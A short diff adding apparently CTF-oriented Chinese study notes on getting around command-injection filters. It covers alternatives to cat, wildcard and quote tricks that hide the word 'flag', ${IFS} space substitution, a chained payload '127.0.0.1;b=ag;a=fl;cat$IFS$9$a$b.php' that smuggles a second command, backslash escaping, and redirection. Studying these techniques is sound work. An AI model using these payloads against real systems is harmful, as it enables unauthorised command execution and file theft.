@@ -1,0 +1,40 @@
+1.查看类命令替代
+cat
+tail--看文件末尾，对一些比较长的文件才有显著效果
+sort--排序并输出内容
+tac 反向显示，从最后一行开始往前显示
+head
+nl 会显示行号
+more 一页一页显示文件内容
+less 与more类似
+od（od -t d1 tmp flag） 以二进制方式读取文件内容
+rev（rev/ flag | rev）
+2.flag字段的替代
+f*:匹配所有f开头的文件
+fla?:匹配所有flax，x代表任意字符
+fla[f-h]:匹配flaf，flag，flah
+fla{f,g.h}:匹配flaf，flag，flah
+f''lag = f""lag = flag
+fla'g'=flag
+3.preg__match 匹配单行正则表达式
+4.空格绕过
+ 1 ${IFS}或$IFS$9可以代替空格  cat${IFS}/flag
+   2. 你可以使用命令替代短命令来获取flag。例如：
+   如果目标服务器允许访问/proc文件系统，你可以尝试以下命令：  
+   cat</flag
+5.命令拼接绕过
+127.0.0.1;b=ag;a=fl;cat$IFS$9$a$b.php
+6.反斜杠\绕过
+当cat，ls被过滤时，可用\绕过，还可以绕过对flag等的过滤，如fl\ag
+ \特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令  
+7.重定向
+.>重定向操作符
+将命令的输出发送到指定的文件
+cat /flag > 1.txt
+● 如果1.txt文件之前不存在，它将被创建，并包含/flag文件的内容。
+● 如果1.txt文件已经存在，它的内容将被/flag文件的内容覆盖
+8.tee命令
+作用与重定向符基本一致，但 tee可以把一份数据同时写入多个文件，而>>或>只能把一份数据写入到一个文件中；  
+
+
+  
